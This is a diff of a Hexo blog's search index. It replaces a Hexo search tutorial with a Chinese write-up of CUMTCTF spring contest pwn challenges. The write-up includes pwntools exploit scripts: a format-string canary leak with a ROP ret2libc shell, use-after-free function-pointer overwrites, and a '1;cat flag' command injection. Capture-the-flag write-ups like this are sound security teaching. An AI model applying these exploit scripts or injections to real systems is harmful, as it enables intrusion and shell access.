@@ -1,321 +1,112 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>Hexo启用搜索功能</title>
-    <url>/2021/03/25/Hexo%E5%90%AF%E7%94%A8%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
-    <content><![CDATA[<h1 id="hexo启用搜索功能"><a class="markdownIt-Anchor" href="#hexo启用搜索功能"></a> Hexo启用搜索功能</h1>
-<p>1.首先在Hexo的根目录下执行以下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm install hexo-generator-searchdb --save <br></code></pre></td></tr></table></figure>
-<p><img src="/2021/03/25/Hexo%E5%90%AF%E7%94%A8%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/C:%5CUsers%5C17473%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210325172142569.png" alt="image-20210325172142569"></p>
-<p>有WARN没关系，最后还是可以用的</p>
-<p>2.在全局配置文件_config.yml，新增如下内容</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">search:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">search.xml</span><br>  <span class="hljs-attr">field:</span> <span class="hljs-string">post</span><br>  <span class="hljs-attr">format:</span> <span class="hljs-string">html</span><br>  <span class="hljs-attr">limit:</span> <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure>
-<p>3.在主题配置文件_config.yml修改local_search为true</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">local_search:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span>```<br></code></pre></td></tr></table></figure>
-<p>4.新建一个页面，命名为 search 。命令如下：</p>
-<figure class="highlight haxe"><table><tr><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> search<br></code></pre></td></tr></table></figure>
-<p>5.编辑刚新建的页面，将页面的类型设置为 search</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>: search<br><span class="hljs-attribute">date</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">03</span>-<span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">15</span><br><span class="hljs-attribute">type</span>: <span class="hljs-string">&quot;search&quot;</span><br></code></pre></td></tr></table></figure>
-<p>6.执行hexo g和hexo d部署完成</p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>CUMTCTF春季赛-PWN</title>
+      <link href="2021/03/30/cumtctf/"/>
+      <url>2021/03/30/cumtctf/</url>
+      
+        <content type="html"><![CDATA[<p>首先庆祝一下咋队得第二吧（原来是第二的，把密码学交了就显示第一了，当时没做出来）</p><p><img src="/2021/03/30/cumtctf/%E7%AC%AC%E4%B8%80.png" alt="图片"></p><h1 id="pwn1"><a class="markdownIt-Anchor" href="#pwn1"></a> PWN1</h1><p>查看程序，逻辑是读取你输入的字符串，然后和CUMTCTF对比，如果通过就执行bin/sh</p><p><img src="/2021/03/30/cumtctf/1.jpg" alt="img"></p><p>在比较前下个断点，进行调试，发现此时对比的是地址0x4008d5</p><p><img src="/2021/03/30/cumtctf/2.jpg" alt="img"></p><p>在看程序中输入的格式是“ld”，说明我们只能输入长整形，所以我们把0x4008d5转换为10进制进行输入4196565，然后调试.，发现此时验证通过了。</p><p><img src="/2021/03/30/cumtctf/3.jpg" alt="img"></p><p>拿到flag</p><p><img src="/2021/03/30/cumtctf/4.jpg" alt="img"></p><h1 id="pwn2"><a class="markdownIt-Anchor" href="#pwn2"></a> PWN2</h1><p>先检查程序，发现程序开启了canary保护和堆栈不可执行</p><p><img src="/2021/03/30/cumtctf/5.jpg" alt="img"></p><p>然后查看程序，程序会先执行一个fmt（）函数，可以发现这里有一个格式字符串的漏洞，可以泄露canary值</p><p><img src="/2021/03/30/cumtctf/6.jpg" alt="img"></p><p>然后执行vul（）函数，可以看到这个函数读取的buf有0x64字节，而buf只有0x20字节存在栈溢出</p><p><img src="/2021/03/30/cumtctf/7.jpg" alt="img"><img src="/2021/03/30/cumtctf/8.jpg" alt="img"></p><p>所以解题思路是先泄露canary，然后构建rop链泄露puts函数地址，然后重启程序，再次泄露canary地址，构建rop链getshell</p><p><img src="/2021/03/30/cumtctf/9.jpg" alt="img"></p><p>因为canary的值距离栈顶是0x8个字节，64位Linux前六个参数用寄存器传递， 后面的才从栈上读取，所以要使var_8是printf函数的第8个参数，因此使用“%7$p”作为printf参数可以泄露出canary的值。所以payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary=<span class="hljs-string">&#x27;pwn2&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>\<span class="hljs-comment">#p=process(&#x27;./pwn2&#x27;)</span><br><br>p = remote(<span class="hljs-string">&quot;1.15.81.218&quot;</span>,<span class="hljs-number">10001</span>)<br><br>pop_rdi=<span class="hljs-number">0x400983</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>start_addr=<span class="hljs-number">0x4006A0</span><br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment"># 泄露canary</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链泄露puts的地址，然后重启程序</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got) + p64(puts_plt)+p64(start_addr)<br><br>p.send(payload)<br><br>\<span class="hljs-comment">#接收put真实地址</span><br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) <br><br>\<span class="hljs-comment">#计算libc基址</span><br><br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>\<span class="hljs-comment">#获取程序中system的地址和/bin/sh的地址</span><br><br>binsh_addr = libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).<span class="hljs-built_in">next</span>()+libc_base<br><br>system_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment">#再次泄露canary值</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链getshell</span><br><br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn3"><a class="markdownIt-Anchor" href="#pwn3"></a> PWN3</h1><p>用ida打开程序，发现程序是一个选择菜单</p><p><img src="/2021/03/30/cumtctf/10.jpg" alt="img"></p><p>然后在选择1中，说是执行ping命令，但是没有进行过滤，会用system函数执行我们输入进去的命令</p><p><img src="/2021/03/30/cumtctf/11.jpg" alt="img"></p><p>选择1，然后1;cat flag，即可拿到Flag</p><p><img src="/2021/03/30/cumtctf/12.jpg" alt="img"></p><h1 id="pwn4"><a class="markdownIt-Anchor" href="#pwn4"></a> PWN4</h1><p>Ida打开程序，发现也是一个选择菜单</p><p><img src="/2021/03/30/cumtctf/a1.jpg" alt="img"></p><p>仔细观察每个选择，发现漏洞点在2.delete中，函数只是free了堆块，但是没有把指针置空，会造成uaf漏洞</p><p><img src="/2021/03/30/cumtctf/%E9%98%BF.jpg" alt="img"></p><p>Gdb调试：</p><p>先申请2个32字节的堆块（size为16 24 32的堆块free后会进入fastbin不会被合并）</p><p>可以看到我们申请的堆块对应一个内存堆和一个print_heap_name函数</p><p><img src="/2021/03/30/cumtctf/clip_image012.jpg" alt="img"></p><p>然后删除这两个堆块，可以看到删除的堆块进入了fastbin</p><p><img src="/2021/03/30/cumtctf/clip_image014.jpg" alt="img"></p><p>这时候我们申请一个堆块，size为8，内容为cccc</p><p><img src="/2021/03/30/cumtctf/clip_image016.jpg" alt="img"></p><p>此时覆盖了第一个堆块的print_heap_name函数指针</p><p><img src="/2021/03/30/cumtctf/clip_image018.jpg" alt="img"></p><p>然后我们选择show，就会调用这个指针，所以我们可以控制这个指针调用我们想要的函数</p><p><img src="/2021/03/30/cumtctf/clip_image020.jpg" alt="img"></p><p>程序中有后门函数，所以只要覆盖成这个就行</p><p><img src="/2021/03/30/cumtctf/clip_image022.jpg" alt="img"></p><p>Payload脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#!/usr/bin/env python</span><br><br>\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&quot;./pwn4&quot;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10003</span>)<br><br>backdoor = <span class="hljs-number">0x0000000400BCE</span><br><br>\<span class="hljs-comment">#p = process(&quot;./pwn4&quot;)</span><br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;6666&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为32的堆块</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;7777&quot;</span>)<br><br>\<span class="hljs-comment">#删除index0</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>\<span class="hljs-comment">#删除index1</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>\<span class="hljs-comment">#添加一个size为4的堆块，内容是后门函数</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(p32(backdoor))<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>\<span class="hljs-comment">#调用index0的print指针</span><br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>p.interactive()<br><br> <br></code></pre></td></tr></table></figure><h1 id="pwn5"><a class="markdownIt-Anchor" href="#pwn5"></a> PWN5</h1><p>用ida打开程序，也是一个让我们选择的程序，选项1是创建账号，2是展示，3是删除，4是添加memory，5选项是验证main_account+16的位置的值是否等于1953330531，然后getshell</p><p><img src="/2021/03/30/cumtctf/clip_image024.jpg" alt="img"></p><p><img src="/2021/03/30/cumtctf/clip_image026.jpg" alt="img"></p><p>所以解题思路是覆盖这个位置的数据为1953330531</p><p>我们注意到删除账号的时候也只是进行了free，没有置空指针，有uaf漏洞利用</p><p><img src="/2021/03/30/cumtctf/clip_image028.jpg" alt="img"></p><p>然后在add memory时，可以读入256个字节。</p><p>Gdb调试：</p><p>先创建一个aaaa，bbbb的账号，堆内存如下</p><p><img src="/2021/03/30/cumtctf/clip_image030.jpg" alt="img"></p><p>然后尝试check，发现检查的main_account+16的位置是0x603010+0x40，也就是64个字节</p><p><img src="/2021/03/30/cumtctf/clip_image032.jpg" alt="img"></p><p>然后删除账号，添加一个memory，内容为68个c</p><p><img src="/2021/03/30/cumtctf/clip_image034.jpg" alt="img"></p><p>就可以覆盖到0x50的位置</p><p>所以只要把0x50位置的值覆盖为1953330531（十六进制0x746d7563）即可</p><p>Payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>\<span class="hljs-comment">#p = process(&#x27;./pwn5&#x27;)</span><br><br>p = remote(<span class="hljs-string">&#x27;1.15.81.218&#x27;</span>, <span class="hljs-number">10004</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Create_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your first name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;your last name:&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;aaaa&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_your_account</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_memory</span>(<span class="hljs-params">payload</span>):</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>  p.recvuntil(<span class="hljs-string">&quot;plz input what you want say:&quot;</span>)<br><br>  \<span class="hljs-comment">#gdb.attach(p)</span><br><br>  p.sendline(payload)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_CUMT</span>():</span><br><br>  p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br><br>  p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>Create_your_account()<br><br>delete_your_account()<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">64</span>+p64(<span class="hljs-number">0x746d7563</span>) <br><br>add_memory(payload)<br><br>\<span class="hljs-comment">#gdb.attach(p)</span><br><br>check_CUMT()<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>教程</category>
+          
+          <category> PWN学习 </category>
+          
+          <category> 学习 </category>
+          
       </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CUMTCTF春季赛-PWN</title>
-    <url>/2021/03/30/cumtctf/</url>
-    <content><![CDATA[<p>首先庆祝一下咋队得第二吧（原来是第二的，把密码学交了就显示第一了，当时没做出来）</p>
-<p><img src="/2021/03/30/cumtctf/%E7%AC%AC%E4%B8%80.png" alt="图片"></p>
-<h1 id="pwn1"><a class="markdownIt-Anchor" href="#pwn1"></a> PWN1</h1>
-<p>查看程序，逻辑是读取你输入的字符串，然后和CUMTCTF对比，如果通过就执行bin/sh</p>
-<p><img src="/2021/03/30/cumtctf/1.jpg" alt="img"></p>
-<p>在比较前下个断点，进行调试，发现此时对比的是地址0x4008d5</p>
-<p><img src="/2021/03/30/cumtctf/2.jpg" alt="img"></p>
-<p>在看程序中输入的格式是“ld”，说明我们只能输入长整形，所以我们把0x4008d5转换为10进制进行输入4196565，然后调试.，发现此时验证通过了。</p>
-<p><img src="/2021/03/30/cumtctf/3.jpg" alt="img"></p>
-<p>拿到flag</p>
-<p><img src="/2021/03/30/cumtctf/4.jpg" alt="img"></p>
-<h1 id="pwn2"><a class="markdownIt-Anchor" href="#pwn2"></a> PWN2</h1>
-<p>先检查程序，发现程序开启了canary保护和堆栈不可执行</p>
-<p><img src="/2021/03/30/cumtctf/5.jpg" alt="img"></p>
-<p>然后查看程序，程序会先执行一个fmt（）函数，可以发现这里有一个格式字符串的漏洞，可以泄露canary值</p>
-<p><img src="/2021/03/30/cumtctf/6.jpg" alt="img"></p>
-<p>然后执行vul（）函数，可以看到这个函数读取的buf有0x64字节，而buf只有0x20字节存在栈溢出</p>
-<p><img src="/2021/03/30/cumtctf/7.jpg" alt="img"><img src="/2021/03/30/cumtctf/8.jpg" alt="img"></p>
-<p>所以解题思路是先泄露canary，然后构建rop链泄露puts函数地址，然后重启程序，再次泄露canary地址，构建rop链getshell</p>
-<p><img src="/2021/03/30/cumtctf/9.jpg" alt="img"></p>
-<p>因为canary的值距离栈顶是0x8个字节，64位Linux前六个参数用寄存器传递， 后面的才从栈上读取，所以要使var_8是printf函数的第8个参数，因此使用“%7$p”作为printf参数可以泄露出canary的值。所以payload如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">\<span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary=<span class="hljs-string">&#x27;pwn2&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>\<span class="hljs-comment">#p=process(&#x27;./pwn2&#x27;)</span><br><br>p = remote(<span class="hljs-string">&quot;1.15.81.218&quot;</span>,<span class="hljs-number">10001</span>)<br><br>pop_rdi=<span class="hljs-number">0x400983</span><br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>start_addr=<span class="hljs-number">0x4006A0</span><br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment"># 泄露canary</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链泄露puts的地址，然后重启程序</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got) + p64(puts_plt)+p64(start_addr)<br><br>p.send(payload)<br><br>\<span class="hljs-comment">#接收put真实地址</span><br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) <br><br>\<span class="hljs-comment">#计算libc基址</span><br><br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>\<span class="hljs-comment">#获取程序中system的地址和/bin/sh的地址</span><br><br>binsh_addr = libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).<span class="hljs-built_in">next</span>()+libc_base<br><br>system_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br> <br><br>p.recvuntil(<span class="hljs-string">&quot;fmtstr,Do you konw it?&quot;</span>)<br><br>\<span class="hljs-comment">#再次泄露canary值</span><br><br>payload = <span class="hljs-string">&quot;%7$p&quot;</span><br><br>p.sendline(payload)<br><br>Canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)<br><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary)) <br><br>p.recvuntil(<span class="hljs-string">&quot;Remeber canary!!&quot;</span>)<br><br>\<span class="hljs-comment">#构造rop链getshell</span><br><br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-<h1 id="pwn3"><a class="markdownIt-Anchor" href="#pwn3"></a> PWN3</h1>
-<p>用ida打开程序，发现程序是一个选择菜单</p>
-<p><img src="/2021/03/30/cumtctf/10.jpg" alt="img"></p>
-<p>然后在选择1中，说是执行ping命令，但是没有进行过滤，会用system函数执行我们输入进去的命令</p>
-<p><img src="/2021/03/30/cumtctf/11.jpg" alt="img"></p>
-<p>选择1，然后1;cat flag，即可拿到Flag</p>
-<p><img src="/2021/03/30/cumtctf/12.jpg" alt="img"></p>
-<h1 id="pwn4"><a class="markdownIt-Anchor" href="#pwn4"></a> PWN4</h1>
-<p>Ida打开程序，发现也是一个选择菜单</p>
-<p><img src="/2021/03/30/cumtctf/a1.jpg" alt="img"></p>
-<p>仔细观察每个选择，发现漏洞点在2.delete中，函数只是free了堆块，但是没有把指针置空，会造成uaf漏洞</p>
-<p><img src="/2021/03/30/cumtctf/%E9%98%BF.jpg" alt="img"></p>
-<p>Gdb调试：</p>
-<p>先申请2个32字节的堆块（size为16 24 32的堆块free后会进入fastbin不会被合并）</p>
-<p>可以看到我们申请的堆块对应一个内存堆和一个print_heap_name函数</p>
-<p><img src="/2021/03/30/cumtctf/clip_image012.jpg" alt="img"></p>
-<p>然后删除这两个堆块，可以看到删除的堆块进入了fastbin</p>
-<p><img src="/2021/03/30/cumtctf/clip_image014.jpg" alt="img"></p>
-<p>这时候我们申请一个堆块，size为8，内容为cccc</p>
-<p><img src="/2021/03/30/cumtctf/clip_image016.jpg" alt="img"></p>
-<p>此时覆盖了第一个堆块的print_heap_name函数指针</p>
-<p><img src="/2021/03/30/cumtctf/clip_image018.jpg" alt="img"></p>
